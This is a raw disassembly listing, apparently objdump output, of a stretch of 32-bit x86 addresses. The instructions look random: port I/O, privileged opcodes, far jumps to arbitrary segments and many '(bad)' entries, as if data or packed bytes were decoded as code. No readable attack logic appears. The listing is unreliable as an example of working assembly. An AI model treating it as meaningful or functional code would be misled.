  405237:	mov    esp,0xcdb63a5b
  40523c:	inc    esi
  40523d:	sahf   
  40523e:	or     esi,DWORD PTR [edx-0x6a]
  405241:	dec    ecx
  405242:	sbb    BYTE PTR [ebx+0x5c],cl
  405245:	push   edx
  405246:	data16 adc dh,al
  405249:	fwait
  40524a:	lods   al,BYTE PTR ds:[esi]
  40524b:	(bad)  
  40524c:	(bad)  
  40524d:	retf   0x3e3c
  405250:	les    esi,FWORD PTR [esi-0x3d]
  405253:	fsubr  DWORD PTR [eax-0x67]
  405256:	inc    ecx
  405257:	jg     0x405205
  405259:	and    al,0xdb
  40525b:	lahf   
  40525c:	mov    ebx,0x7eda654
  405261:	in     al,dx
  405262:	push   esp
  405263:	add    esi,esi
  405265:	stos   BYTE PTR es:[edi],al
  405266:	jae    0x405253
  405268:	dec    esp
  405269:	pushf  
  40526a:	fsub   st,st(3)
  40526c:	or     bl,BYTE PTR [esi+ebx*2+0x6f]
  405270:	adc    ebx,DWORD PTR [edx+0x2d]
  405273:	fsubp  st(0),st
  405275:	sar    BYTE PTR [eax+0x5beffc7f],0x67
  40527c:	adc    ah,ch
  40527e:	inc    edx
  40527f:	push   edi
  405280:	popa   
  405281:	(bad)  
  405282:	pusha  
  405283:	data16 loopne 0x40525c
  405286:	repz fmul st,st(7)
  405289:	outs   dx,DWORD PTR ds:[esi]
  40528a:	mov    ebx,0x69183461
  40528f:	jmp    0x1c45:0xa5bccca1
  405296:	push   0xffffffcd
  405298:	dec    esi
  405299:	mov    gs,WORD PTR ds:0x89bc98a2
  40529f:	cli    
  4052a0:	push   eax
  4052a1:	and    BYTE PTR ds:0x3be2efab,0x9b
  4052a8:	gs mov bh,0x92
  4052ab:	outs   dx,DWORD PTR ds:[esi]
  4052ac:	and    dh,al
  4052ae:	push   cs
  4052af:	fstp   DWORD PTR [ebp+0x5f]
  4052b2:	pop    esp
  4052b3:	in     eax,0xed
  4052b5:	mov    al,0x76
  4052b7:	rol    DWORD PTR [ebp+0x52],1
  4052ba:	pop    ebp
  4052bb:	outs   dx,BYTE PTR ds:[esi]
  4052bc:	push   es
  4052bd:	xchg   edi,eax
  4052be:	push   ss
  4052bf:	xor    BYTE PTR [edi+0x4802d4d2],dh
  4052c5:	add    eax,0xc976e5f
  4052ca:	xor    eax,0x26d038af
  4052cf:	pop    esp
  4052d0:	out    dx,al
  4052d1:	adc    bl,BYTE PTR [ebx-0x53db747f]
  4052d7:	aad    0x20
  4052d9:	push   cs
  4052da:	xchg   esp,eax
  4052db:	jmp    0x4052b8
  4052dd:	lea    edi,[ebx]
  4052df:	loop   0x405325
  4052e1:	iret   
  4052e2:	shl    BYTE PTR [edx+0xa222f45],cl
  4052e8:	dec    ecx
  4052e9:	jns    0x4052ef
  4052eb:	sahf   
  4052ec:	pop    eax
  4052ed:	sbb    bl,BYTE PTR [edi+0x2994dc3b]
  4052f3:	pop    ebp
  4052f4:	out    0xd9,eax
  4052f6:	mov    dh,0x8c
  4052f8:	inc    ecx
  4052f9:	and    ecx,DWORD PTR [esi]
  4052fb:	mov    ecx,fs
  4052fd:	add    al,0x97
  4052ff:	lahf   
  405300:	push   edi
  405301:	push   ebp
  405302:	push   esi
  405303:	inc    esi
  405304:	push   edi
  405305:	cmp    al,0x3f
  405307:	jmp    DWORD PTR [edx+0x1]
  40530a:	jbe    0x4052db
  40530c:	ror    BYTE PTR [esi-0x65],1
  40530f:	push   cs
  405310:	(bad)
  405313:	jns    0x4052a4
  405315:	push   ss
  405316:	push   edx
  405317:	ret    
  405318:	xor    ah,0x8e
  40531b:	clc    
  40531c:	and    al,0xa4
  40531e:	pushf  
  40531f:	imul   ebp,DWORD PTR [ecx+0x25],0x23
  405323:	pop    eax
  405324:	sar    DWORD PTR [edi+ebp*4],1
  405327:	inc    esi
  405328:	out    0x2e,eax
  40532a:	hlt    
  40532b:	add    BYTE PTR [ecx-0x661d48bc],ch
  405331:	in     eax,0x6f
  405333:	dec    eax
  405334:	div    DWORD PTR [ebp+0x22]
  405337:	inc    edi
  405338:	mov    ebx,0xbcdcdd30
  40533d:	dec    edi
  40533e:	dec    edi
  40533f:	inc    eax
  405340:	jp     0x4052cd
  405342:	dec    esp
  405343:	push   ecx
  405344:	pop    edx
  405345:	xchg   ebx,eax
  405346:	jns    0x4052f1
  405348:	add    BYTE PTR [ebx+0x567b9d15],al
  40534e:	das    
  40534f:	and    edx,DWORD PTR [ebx+0x38]
  405352:	jmp    0x3b9:0x2d794779
  405359:	call   0x42b8b223
  40535e:	dec    edi
  40535f:	inc    eax
  405360:	aaa    
  405361:	or     al,0x8
  405363:	xchg   edi,eax
  405364:	fiadd  WORD PTR [ecx]
  405366:	fst    QWORD PTR [esi]
  405368:	in     al,0xf0
  40536a:	and    eax,0x57cafee7
  40536f:	jle    0x405333
  405371:	jl     0x405385
  405373:	pop    edi
  405374:	dec    esp
  405375:	shr    DWORD PTR [ebp-0x1afd9e95],cl
  40537b:	ds adc al,0xed
  40537e:	ret    0xf251
  405381:	bound  ebp,QWORD PTR [ebx-0x350ff851]
  405387:	add    esp,0x7d779a0e
  40538d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40538e:	sub    eax,0x558f474
  405393:	test   BYTE PTR [edi],0x1
  405396:	lahf   
  405397:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405398:	int    0xa9
  40539a:	jae    0x40536e
  40539c:	dec    ebp
  40539d:	sete   BYTE PTR [ecx-0x18]
  4053a1:	mov    ch,0x22
  4053a3:	dec    ebp
  4053a4:	scas   eax,DWORD PTR es:[edi]
  4053a5:	jecxz  0x4053df
  4053a7:	mov    eax,ds:0x4d118b53
  4053ac:	loopne 0x405347
  4053ae:	mov    ch,0x1
  4053b0:	pop    esp
  4053b1:	cmc    
  4053b2:	mov    bl,BYTE PTR [esi]
  4053b4:	aaa    
  4053b5:	int3   
  4053b6:	pop    ss
  4053b7:	int    0x8d
  4053b9:	shl    esp,0x3d
  4053bc:	mov    ebx,0x3756d522
  4053c1:	sbb    al,0x4e
  4053c3:	mov    ch,0x91
  4053c5:	(bad)  
  4053c6:	fist   DWORD PTR [eax+0x10b95eee]
  4053cc:	jmp    0xde717948
  4053d1:	mov    bh,0xde
  4053d3:	inc    eax
  4053d4:	dec    edi
  4053d5:	in     eax,0x14
  4053d7:	inc    ecx
  4053d8:	rdmsr  
  4053da:	dec    edx
  4053db:	popf   
  4053dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053dd:	rcl    DWORD PTR [eax+0xd],0x5e
  4053e1:	(bad)  
  4053e2:	dec    esi
  4053e3:	and    edi,ecx
  4053e5:	test   eax,0x41d880be
  4053ea:	call   0x2fab:0x24e603fb
  4053f1:	pop    esp
  4053f2:	sub    DWORD PTR [eax-0x8],0xf823e190
  4053f9:	test   DWORD PTR [eax+0x7b],0x108c2ad3
  405400:	in     al,0x9f
  405402:	inc    edx
  405403:	in     eax,dx
  405404:	jne    0x40543c
  405406:	in     al,0x72
  405408:	aaa    
  405409:	mov    ecx,fs
  40540b:	inc    esi
  40540c:	and    ch,ah
  40540e:	mov    esp,0xfd8bc43b
  405413:	jno    0x4053df
  405415:	pop    esi
  405416:	je     0x40546c
  405418:	or     BYTE PTR [edx+0x78056e5a],ah
  40541e:	ror    DWORD PTR [ebp+edi*8+0x1d],1
  405422:	add    al,0xba
  405424:	shl    edx,1
  405426:	push   esi
  405427:	call   0x371a:0x11660c79
  40542e:	out    dx,al
  40542f:	pop    edx
  405430:	xchg   esp,eax
  405431:	retf   
  405432:	mov    al,0x86
  405434:	jge    0x40549d
  405436:	call   0x7cab6372
  40543b:	test   cl,bh
  40543d:	cmc    
  40543e:	add    al,al
  405440:	hlt    
  405441:	pop    edi
  405442:	mov    WORD PTR [edi-0x1e],fs
  405445:	push   0x3c518ba4
  40544a:	gs push ss
  40544c:	push   cs
  40544d:	push   eax
  40544e:	gs and al,0x7f
  405451:	in     eax,0xf7
  405453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405454:	mov    ch,0xff
  405456:	and    edi,esi
  405458:	(bad)  
  405459:	int    0x67
  40545b:	mov    al,0x0
  40545d:	scas   al,BYTE PTR es:[edi]
  40545e:	daa    
  40545f:	or     eax,0xf1170d19
  405464:	das    
  405465:	sbb    al,0x3c
  405467:	(bad)  
  405468:	out    0x6a,eax
  40546a:	outs   dx,DWORD PTR ds:[esi]
  40546b:	push   edx
  40546c:	mov    ebx,0x1ffbbd65
  405471:	(bad)  
  405472:	mov    ch,BYTE PTR [edx]
  405474:	push   ss
  405475:	push   esp
  405476:	mov    edi,0x4a5dc204
  40547b:	ret    0xc563
  40547e:	dec    ecx
  40547f:	mov    edx,0x243bea61
  405484:	shr    edx,1
  405486:	xor    BYTE PTR [ecx-0x33],cl
  405489:	jl     0x40543f
  40548b:	jge    0x405452
  40548d:	nop
  40548e:	xlat   BYTE PTR ds:[ebx]
  40548f:	(bad)  
  405490:	push   ebp
  405491:	adc    BYTE PTR [esi-0x36],0xa7
  405495:	sbb    esi,edx
  405497:	div    BYTE PTR [eax]
  405499:	leave  
  40549a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40549b:	mov    cl,bl
  40549d:	pop    ebp
  40549e:	jge    0x405455
  4054a0:	sahf   
  4054a1:	out    dx,eax
  4054a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054a3:	mov    ebp,0x7f91c5fa
  4054a8:	pop    esp
  4054a9:	xchg   ecx,eax
  4054aa:	jmp    0x4054b5
  4054ac:	sti    
  4054ad:	cwde   
  4054ae:	and    eax,0x71eea6ff
  4054b3:	test   DWORD PTR [edi-0x77dad6fa],ebp
  4054b9:	bound  esi,QWORD PTR [ebp+0x51263586]
  4054bf:	or     al,0x92
  4054c1:	ins    BYTE PTR es:[edi],dx
  4054c2:	lock and al,0x5b
  4054c5:	cmp    ah,BYTE PTR [ecx+eiz*2]
  4054c8:	es jns 0x40554a
  4054cb:	out    dx,al
  4054cc:	scas   al,BYTE PTR es:[edi]
  4054cd:	scas   al,BYTE PTR es:[edi]
  4054ce:	cmp    edx,DWORD PTR [esp+edx*1+0x36]
  4054d2:	data16 fcomp DWORD PTR [edx+0x6c]
  4054d6:	or     al,0xf5
  4054d8:	in     al,0xf2
  4054da:	xchg   ebp,eax
  4054db:	push   esp
  4054dc:	imul   esp,edi,0x18
  4054df:	sbb    ebp,DWORD PTR ds:0xaa6a0c8a
  4054e5:	inc    edx
  4054e6:	pop    ebx
  4054e7:	jge    0x40548e
  4054e9:	ins    BYTE PTR es:[edi],dx
  4054ea:	adc    bh,BYTE PTR [edi-0x429163c1]
  4054f0:	dec    eax
  4054f1:	mov    bl,0x19
  4054f3:	lods   eax,DWORD PTR ds:[esi]
  4054f4:	jbe    0x4054fe
  4054f6:	pushf  
  4054f7:	dec    ebx
  4054f8:	jnp    0x405557
  4054fa:	mov    edi,0x5aff6df8
  4054ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405500:	ins    BYTE PTR es:[edi],dx
  405501:	std    
  405502:	inc    ebx
  405503:	sbb    BYTE PTR [ecx-0x1823ec16],bl
  405509:	scas   eax,DWORD PTR es:[edi]
  40550a:	ss pushf 
  40550c:	pop    es
  40550d:	in     al,dx
  40550e:	adc    eax,0x1eb6381e
  405513:	mov    eax,ds:0x2100c467
  405518:	in     al,0x12
  40551a:	adc    dl,BYTE PTR [eax+0x76cfc1d9]
  405520:	cmp    BYTE PTR [ecx+0x2eb5ad6d],0x4
  405527:	icebp  
  405528:	and    eax,0xd192a6c2
  40552d:	test   ch,ch
  40552f:	scas   eax,DWORD PTR es:[edi]
  405530:	xor    edi,DWORD PTR [ecx]
  405532:	sub    edi,DWORD PTR [esi-0x14]
  405535:	mov    esp,0x7b452c26
  40553a:	cmp    esi,ebx
  40553c:	test   eax,0x6ee6136b
  405541:	test   al,0x3e
  405543:	dec    ebx
  405544:	stos   BYTE PTR es:[edi],al
  405545:	sti    
  405546:	jg     0x4054e2
  405548:	cmp    eax,0x11a2313d
  40554d:	sub    al,0xfb
  40554f:	or     dh,bh
  405551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405552:	test   cl,al
  405554:	gs call 0xc15d:0xb56ecebd
  40555c:	fucomp st(6)
  40555e:	je     0x40552e
  405560:	jbe    0x4054ec
  405562:	hlt    
  405563:	sti    
  405564:	and    BYTE PTR [edi+0x28c19617],bh
  40556a:	mov    bh,0xa0
  40556c:	jl     0x4055d8
  40556e:	xchg   edx,eax
  40556f:	pop    es
  405570:	and    al,0xe7
  405572:	xchg   ebp,eax
  405573:	push   edi
  405574:	fsubp  st(1),st
  405576:	inc    edi
  405577:	mov    ds:0x54982a8d,al
  40557c:	aam    0xb6
  40557e:	dec    ebx
  40557f:	packssdw mm4,mm2
  405582:	dec    edx
  405583:	xor    ecx,DWORD PTR [ecx-0x45]
  405586:	repnz cmp ah,BYTE PTR [esi]
  405589:	gs ret 
  40558b:	(bad)  
  40558c:	mov    ecx,0xe88dfa39
  405591:	in     al,dx
  405592:	aaa    
  405593:	sbb    al,0x65
  405595:	xor    BYTE PTR [edx-0x65],bh
  405598:	fldenv [ecx]
  40559a:	jnp    0x40553b
  40559c:	fstp   QWORD PTR [ecx-0x6a]
  40559f:	adc    edx,DWORD PTR [esi+0x8]
  4055a2:	cmp    ebp,DWORD PTR [ebp+0x5a3f14f3]
  4055a8:	pop    esi
  4055a9:	pop    ss
  4055aa:	or     esi,DWORD PTR ds:0x56bf608a
  4055b0:	add    DWORD PTR [esi-0x39],ebp
  4055b3:	iret   
  4055b4:	(bad)  
  4055b5:	ret    0x1fe1
  4055b8:	add    BYTE PTR [edx+0x5d],dl
  4055bb:	jne    0x4055f5
  4055bd:	(bad)  
  4055bf:	pop    ebx
  4055c0:	imul   edx,DWORD PTR [edx+0x34],0x70
  4055c4:	out    0xa8,eax
  4055c6:	or     ebx,DWORD PTR [ecx]
  4055c8:	sti    
  4055c9:	mov    eax,ds:0xc795e55c
  4055ce:	loopne 0x405627
  4055d0:	sbb    ebx,DWORD PTR [ecx+esi*8]
  4055d3:	cld    
  4055d4:	fist   DWORD PTR [ecx+0x8c75889]
  4055da:	pop    edi
  4055db:	das    
  4055dc:	xchg   esi,eax
  4055dd:	das    
  4055de:	and    cl,BYTE PTR ds:0x2308a274
  4055e4:	mov    bh,0x2b
  4055e6:	mov    al,ds:0xcc2d747b
  4055eb:	fwait
  4055ec:	mov    es,WORD PTR [ebx+ebx*1-0x79]
  4055f0:	sbb    DWORD PTR [edx],ebx
  4055f2:	pop    eax
  4055f3:	jmp    0x4055df
  4055f5:	sub    BYTE PTR [eax],ah
  4055f7:	cs mov edx,0x741e3a90
  4055fd:	xor    eax,0xb11cb901
  405602:	mov    ?,ebx
  405604:	daa    
  405605:	xchg   BYTE PTR [edi+0x30db3f4a],bl
  40560b:	jae    0x4055d4
  40560d:	add    ecx,ebp
  40560f:	add    BYTE PTR [esi],0xdb
  405612:	mov    BYTE PTR [edx+0x1b],0xbd
  405616:	mov    ch,0x6c
  405618:	test   al,0x63
  40561a:	int3   
  40561b:	lahf   
  40561c:	and    eax,0x51cf6e61
  405621:	or     al,0x2
  405623:	sub    al,0x60
  405625:	jbe    0x40566f
  405627:	out    0xe4,al
  405629:	test   eax,0xd74c89ed
  40562e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40562f:	adc    edi,DWORD PTR [esi+eax*8]
  405632:	shr    DWORD PTR [eax-0xaead604],0x18
  405639:	das    
  40563a:	jns    0x4055fd
  40563c:	outs   dx,DWORD PTR ds:[esi]
  40563d:	push   ebx
  40563e:	pop    edi
  40563f:	xchg   ecx,eax
  405640:	jmp    0x72e0501d
  405645:	pop    eax
  405646:	inc    ecx
  405647:	mov    edi,0x97281080
  40564c:	fs jmp 0x40569c
  40564f:	jne    0x40568c
  405651:	pusha  
  405652:	cmc    
  405653:	inc    edx
  405654:	mov    al,ds:0x4117d227
  405659:	xlat   BYTE PTR ds:[ebx]
  40565a:	icebp  
  40565b:	cmp    ecx,DWORD PTR [eax+0x41e99b2b]
  405661:	repnz stc 
  405663:	pop    esi
  405664:	out    dx,al
  405665:	ins    DWORD PTR es:[edi],dx
  405666:	ins    BYTE PTR es:[edi],dx
  405667:	sbb    al,dl
  405669:	(bad)  
  40566b:	mov    cl,0x42
  40566d:	lods   eax,DWORD PTR ds:[esi]
  40566e:	jmp    0x3d89:0xe2e908b5
  405675:	push   0xf
  405677:	inc    esp
  405678:	das    
  405679:	and    dh,BYTE PTR [edi]
  40567b:	ds scas eax,DWORD PTR es:[edi]
  40567d:	dec    edi
  40567e:	or     eax,0x1a09633d
  405683:	imul   ecx,DWORD PTR [ecx],0xffffffc8
  405686:	adc    bl,BYTE PTR [edx]
  405688:	mul    esi
  40568a:	arpl   WORD PTR ds:0xaebedef5,di
  405690:	adc    al,0xdb
  405692:	adc    DWORD PTR [edi-0x53],edx
  405695:	fadd   DWORD PTR [ecx-0x59d859fb]
  40569b:	call   0x42ed2743
  4056a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056a1:	and    BYTE PTR [edi+0x4f],cl
  4056a4:	ins    BYTE PTR es:[edi],dx
  4056a5:	stos   DWORD PTR es:[edi],eax
  4056a6:	ss xchg ecx,eax
  4056a8:	push   ebp
  4056a9:	lods   al,BYTE PTR ds:[esi]
  4056aa:	loopne 0x405698
  4056ac:	pushf  
  4056ad:	and    eax,0xe094416e
  4056b2:	dec    ebp
  4056b3:	fbstp  TBYTE PTR [esi-0x673f20ac]
  4056b9:	(bad)  
  4056ba:	hlt    
  4056bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056bc:	mov    dl,0x0
  4056be:	sbb    BYTE PTR [ebx+0x32],ch
  4056c1:	add    ch,dh
  4056c3:	xchg   ebp,eax
  4056c4:	std    
  4056c5:	pop    ebp
  4056c6:	xchg   esp,eax
  4056c7:	mov    eax,0xdd353c61
  4056cc:	mov    edi,0x665a6949
  4056d1:	xor    eax,esi
  4056d3:	push   ss
  4056d4:	aad    0x1c
  4056d6:	xchg   ebp,eax
  4056d7:	das    
  4056d8:	or     eax,0xc90e6987
  4056dd:	dec    ebx
  4056de:	pop    eax
  4056df:	pop    esi
  4056e0:	and    DWORD PTR [ecx-0x5765d91c],eax
  4056e6:	xor    BYTE PTR [ebx+0x31],cl
  4056e9:	test   ebp,0x7cf1ebcb
  4056ef:	in     al,dx
  4056f0:	and    BYTE PTR [esi+0x11],bh
  4056f3:	or     bh,BYTE PTR [esi]
  4056f5:	mov    esi,0x86c47a3a
  4056fa:	rol    DWORD PTR [edx+0x3f439e81],1
  405700:	repnz or al,0x29
  405703:	inc    ecx
  405704:	pop    eax
  405705:	in     eax,dx
  405706:	retf   
  405707:	shr    DWORD PTR [esi+0x70cf0cbd],1
  40570d:	sbb    BYTE PTR [esi-0x45],bl
  405710:	inc    edx
  405711:	push   esp
  405712:	out    0xa9,eax
  405714:	inc    ecx
  405715:	push   ss
  405716:	add    eax,0x907e3651
  40571b:	ins    BYTE PTR es:[edi],dx
  40571c:	pop    edi
  40571d:	in     eax,0xc7
  40571f:	mov    dl,0x81
  405721:	adc    eax,edx
  405723:	outs   dx,BYTE PTR ds:[esi]
  405724:	add    edi,edi
  405726:	ds pop eax
  405728:	sub    bl,BYTE PTR ss:[edi-0x76]
  40572c:	sub    dh,BYTE PTR [ebx-0x37a20b7]
  405732:	xchg   edx,eax
  405733:	jo     0x405783
  405735:	xchg   DWORD PTR [esi-0x88cc38f],esi
  40573b:	jecxz  0x405742
  40573d:	imul   edi,DWORD PTR ds:0x846d4db2,0x9b2e736
  405747:	xor    eax,0xc0970c0d
  40574c:	lods   eax,DWORD PTR ds:[esi]
  40574d:	add    edi,DWORD PTR [edi-0x4478e99b]
  405753:	jae    0x405794
  405755:	and    ah,BYTE PTR [esi-0x4b6d462]
  40575b:	or     dl,bh
  40575d:	fucom  st(4)
  40575f:	xor    eax,eax
  405761:	stc    
  405762:	dec    esi
  405763:	das    
  405764:	repz enter 0xc251,0x5f
  405769:	jmp    0xd2d4:0x990673d3
  405770:	mov    ebp,0xbd85496a
  405775:	inc    esp
  405776:	mov    al,ds:0xbe9c0345
  40577b:	xchg   edi,eax
  40577c:	aam    0xbb
  40577e:	out    0x4,eax
  405780:	add    cl,dl
  405782:	adc    edi,0x12b9ae13
  405788:	inc    edi
  405789:	pop    ebp
  40578a:	lock push 0xf421ccde
  405790:	in     eax,dx
  405791:	(bad)  
  405792:	pop    esp
  405793:	hlt    
  405794:	inc    esi
  405795:	pop    esp
  405796:	jle    0x4057bd
  405798:	adc    DWORD PTR [ecx],ecx
  40579a:	cld    
  40579b:	sbb    BYTE PTR [edx+eax*2-0x65d0929a],0x5c
  4057a3:	xor    ebp,DWORD PTR [eax+0x6b9ac401]
  4057a9:	push   edx
  4057aa:	or     bl,dl
  4057ac:	sbb    cl,BYTE PTR [edx-0x35]
  4057af:	fisubr DWORD PTR ds:0xbc46aaf2
  4057b5:	cwde   
  4057b6:	aam    0x46
  4057b8:	mov    ah,0x82
  4057ba:	dec    edi
  4057bb:	idiv   BYTE PTR [ebp+0x57]
  4057be:	ss xchg esi,eax
  4057c0:	fiadd  WORD PTR [ebp+0x5f]
  4057c3:	in     al,dx
  4057c4:	xchg   ch,ch
  4057c6:	mov    DWORD PTR ss:[esi],edi
  4057c9:	add    eax,0xe8989e94
  4057ce:	dec    esp
  4057cf:	jl     0x405752
  4057d1:	pop    eax
  4057d2:	xchg   ecx,eax
  4057d3:	daa    
  4057d4:	xchg   ebp,eax
  4057d5:	pusha  
  4057d6:	push   ebp
  4057d7:	xor    BYTE PTR [ecx-0x20],dl
  4057da:	loop   0x405815
  4057dc:	mov    ch,0x2d
  4057de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057df:	jp     0x40584f
  4057e1:	in     al,dx
  4057e2:	mov    bl,0xa1
  4057e4:	xor    edi,DWORD PTR [ebx]
  4057e6:	dec    ecx
  4057e7:	push   esp
  4057e8:	inc    esp
  4057e9:	sbb    eax,0x3045af29
  4057ee:	cmp    dh,bl
  4057f0:	mov    ebx,0x6c265484
  4057f5:	pop    ebx
  4057f6:	xor    BYTE PTR [esp+ecx*8+0x6e552c30],ch
  4057fd:	sub    edx,DWORD PTR [esi+0x5b6e5a31]
  405803:	(bad)  
  405804:	adc    DWORD PTR [edx],ebx
  405806:	pop    edi
  405807:	mov    cs,ecx
  405809:	add    DWORD PTR [eax],edx
  40580b:	data16 aaa 
  40580d:	jmp    0x859c85b8
  405812:	outs   dx,DWORD PTR ds:[esi]
  405813:	pop    edi
  405814:	mov    edx,0x82715909
  405819:	add    eax,0x422b0e8f
  40581e:	call   FWORD PTR [ebp-0xa8786c6]
  405824:	jo     0x4057c5
  405826:	pushf  
  405827:	pop    esp
  405828:	aad    0x13
  40582a:	push   ss
  40582b:	pop    es
  40582c:	movq   mm1,QWORD PTR [ecx-0x35]
  405830:	jmp    0x4ec9967d
  405835:	mov    ecx,0x742951b6
  40583a:	es dec esp
  40583c:	push   ds
  40583d:	dec    esp
  40583e:	(bad)  
  405840:	mov    fs,WORD PTR [edx+0x4ecf2fbd]
  405846:	jge    0x405828
  405848:	jb     0x4058a8
  40584a:	imul   ecx,esi,0x2
  40584d:	mov    ds:0x1185eda6,al
  405852:	stos   DWORD PTR es:[edi],eax
  405853:	or     ebp,DWORD PTR [eax+edi*1]
  405856:	inc    eax
  405857:	jo     0x4058ce
  405859:	loope  0x40581f
  40585b:	and    ebp,DWORD PTR [bx-0x586c]
  405860:	sbb    ecx,esp
  405862:	out    0x8b,eax
  405864:	inc    ebx
  405865:	pushf  
  405866:	dec    edx
  405867:	mov    dl,dh
  405869:	push   eax
  40586a:	nop
  40586b:	or     DWORD PTR [edi-0x474a54be],esp
  405871:	adc    bh,BYTE PTR [ecx-0x37]
  405874:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405875:	fs gs push esi
  405878:	mov    esp,ecx
  40587a:	push   edi
  40587b:	inc    edi
  40587c:	pop    esi
  40587d:	pop    ebx
  40587e:	pop    ecx
  40587f:	or     BYTE PTR [ebp-0x10],bl
  405882:	arpl   WORD PTR [ecx+ebp*1-0xe],di
  405886:	div    ch
  405888:	add    edi,DWORD PTR [edx]
  40588a:	and    eax,0x210971ca
  40588f:	xor    al,0xe2
  405891:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405892:	inc    edx
  405893:	enter  0x2698,0x71
  405897:	jnp    0x4058d5
  405899:	pop    es
  40589a:	push   es
  40589b:	mov    WORD PTR [ecx-0x76],ss
  40589e:	adc    al,0x2a
  4058a0:	in     al,0xa4
  4058a2:	jb     0x4058a8
  4058a4:	push   0x4d
  4058a6:	enter  0x7292,0x93
  4058aa:	lea    esp,[ecx+0x5d559689]
  4058b0:	add    DWORD PTR [edi],edx
  4058b2:	mov    WORD PTR [ecx],?
  4058b4:	rcr    DWORD PTR [ecx+0x5a],1
  4058b7:	pop    edi
  4058b8:	cmp    edi,ebp
  4058ba:	sub    DWORD PTR [esi+0x346191cf],ebx
  4058c0:	lods   al,BYTE PTR ds:[esi]
  4058c1:	ja     0x40590a
  4058c3:	jnp    0x4058a3
  4058c5:	idiv   DWORD PTR [edi+ebp*2-0x55a5589f]
  4058cc:	loope  0x4058ef
  4058ce:	ds iret 
  4058d0:	hlt    
  4058d1:	mov    ss,WORD PTR [esi+0x199e679a]
  4058d7:	dec    ecx
  4058d8:	mov    gs,WORD PTR [edx+0x38048077]
  4058de:	ret    0xe0d8
  4058e1:	outs   dx,DWORD PTR ds:[esi]
  4058e2:	cmp    BYTE PTR [esi+0x57112f21],bh
  4058e8:	(bad)  
  4058e9:	out    dx,al
  4058ea:	mov    ch,0xaa
  4058ec:	in     eax,0x21
  4058ee:	aad    0x2e
  4058f0:	mov    eax,0xf0ce97e6
  4058f5:	jecxz  0x4058dc
  4058f7:	push   0x5b5d8f5
  4058fc:	xchg   BYTE PTR [ebp-0x3ae0a022],dl
  405902:	popa   
  405903:	clc    
  405904:	punpcklwd mm2,DWORD PTR [ecx+0x15]
  405908:	js     0x405959
  40590a:	bound  edi,QWORD PTR [ebp+0x6e]
  40590d:	push   ebp
  40590e:	lahf   
  40590f:	fnsave [ebp+0x6c6617a5]
  405915:	inc    ebp
  405916:	(bad)  
  405917:	repz mov ebp,?
  40591a:	gs add al,0xa
  40591d:	retf   
  40591e:	ins    BYTE PTR es:[edi],dx
  40591f:	xchg   ebx,eax
  405920:	mov    dl,0xac
  405922:	mov    edi,0xc3339803
  405927:	daa    
  405928:	or     ebx,ecx
  40592a:	stos   DWORD PTR es:[edi],eax
  40592b:	in     al,0xac
  40592d:	js     0x40593a
  40592f:	sbb    bl,0x1
  405932:	push   esp
  405933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405934:	in     eax,0x1d
  405936:	add    ah,BYTE PTR [ecx]
  405938:	lods   eax,DWORD PTR ds:[esi]
  405939:	in     eax,dx
  40593a:	popa   
  40593b:	mov    ah,0xe7
  40593d:	cmp    al,0x6f
  40593f:	popf   
  405940:	or     BYTE PTR [ecx+0x72d2a8f8],0x47
  405947:	mov    esi,0xd13d05ae
  40594c:	(bad)  
  40594d:	pushf  
  40594e:	imul   eax,DWORD PTR [esi+0x25e20445],0xd4693fad
  405958:	sub    eax,DWORD PTR [edi-0x700ef554]
  40595e:	xor    DWORD PTR ds:0xc5aed712,eax
  405964:	fcom   DWORD PTR [eax+eiz*4-0x15932644]
  40596b:	xchg   al,ch
  40596d:	jmp    0x405944
  40596f:	xlat   BYTE PTR ds:[ebx]
  405970:	sub    al,0xd5
  405972:	mov    al,ds:0xe2397eff
  405977:	scas   al,BYTE PTR es:[edi]
  405978:	or     eax,0xf008575
  40597d:	add    BYTE PTR [ebp-0x18],ah
  405980:	sahf   
  405981:	mov    bh,BYTE PTR [edi]
  405983:	dec    eax
  405984:	call   0x4b3b:0x967c48dc
  40598b:	inc    eax
  40598c:	jle    0x40591a
  40598e:	je     0x40597a
  405990:	das    
  405991:	popa   
  405992:	inc    esi
  405993:	scas   al,BYTE PTR es:[edi]
  405994:	out    dx,al
  405995:	(bad)  
  405996:	cld    
  405997:	fidivr WORD PTR [esi+0x7]
  40599a:	add    eax,0x21e6eae2
  40599f:	cmp    esp,DWORD PTR [esi]
  4059a1:	add    esi,DWORD PTR [edi+0x7971b2f6]
  4059a7:	out    0x89,eax
  4059a9:	je     0x4059b8
  4059ab:	sub    DWORD PTR [edx-0x201284a3],edx
  4059b1:	xchg   ecx,eax
  4059b2:	lock (bad) 
  4059b4:	test   BYTE PTR [edi-0x6063f9ce],cl
  4059ba:	adc    al,0xb4
  4059bc:	pop    eax
  4059bd:	cmp    ah,ch
  4059bf:	jae    0x40598e
  4059c1:	push   0x6e
  4059c3:	xchg   ebx,eax
  4059c4:	ficomp DWORD PTR [ecx-0x25]
  4059c7:	out    0x56,al
  4059c9:	fimul  WORD PTR [ebp+0x43]
  4059cc:	or     esp,0x7a
  4059cf:	jae    0x405968
  4059d1:	lods   eax,DWORD PTR ds:[esi]
  4059d2:	push   cs
  4059d3:	loope  0x4059f7
  4059d5:	dec    eax
  4059d6:	adc    DWORD PTR [ebx],eax
  4059d8:	pop    esp
  4059d9:	xchg   ebp,eax
  4059da:	int3   
  4059db:	xchg   ecx,eax
  4059dc:	push   esi
  4059dd:	sbb    eax,0x8fb9602e
  4059e2:	fcomp  QWORD PTR [esp+eax*2]
  4059e5:	loop   0x4059cc
  4059e7:	shl    esp,1
  4059e9:	sti    
  4059ea:	mov    ch,0x21
